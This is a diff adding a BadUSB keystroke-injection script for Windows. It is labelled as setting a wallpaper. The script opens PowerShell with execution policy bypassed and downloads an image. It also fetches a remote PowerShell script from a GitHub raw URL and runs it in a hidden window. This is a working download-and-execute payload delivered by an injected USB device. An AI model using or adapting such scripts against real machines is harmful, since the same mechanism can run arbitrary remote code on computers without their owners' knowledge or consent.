@@ -1,0 +1,34 @@
+REM Set image as wallpaper
+REM Target: Windows 10, Windows 11
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -Ep Bypass
+ENTER
+
+DELAY 1000
+STRING $imageUrl = 'http://example.com/image.jpg';
+STRING $shellUrl = 'https://raw.githubusercontent.com/vstelmakh/flipper/master/badusb/windows/wallpaper/start.ps1';
+STRING $location = "$env:tmp" + '\vsbadusbpayload';
+STRING New-Item -ItemType Directory -Path "${location}" -Force;
+ENTER
+DELAY 500
+STRING @"
+ENTER
+STRING Remove-Item "${location}\setup.ps1" -Force -ErrorAction SilentlyContinue;
+STRING Invoke-RestMethod -Uri '${imageUrl}' -OutFile "$env:userprofile\Desktop\wallpaper-717c63f7864fa8c725ebd30a15428302.jpg";
+STRING Invoke-RestMethod -Uri '${shellUrl}' -OutFile "${location}\start.ps1";
+STRING ."${location}\start.ps1";
+ENTER
+STRING "@ | Out-File -FilePath "$location\setup.ps1" -Force
+ENTER
+ENTER
+STRING exit
+ENTER
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass .("$env:tmp" + '\vsbadusbpayload\setup.ps1')
+ENTER
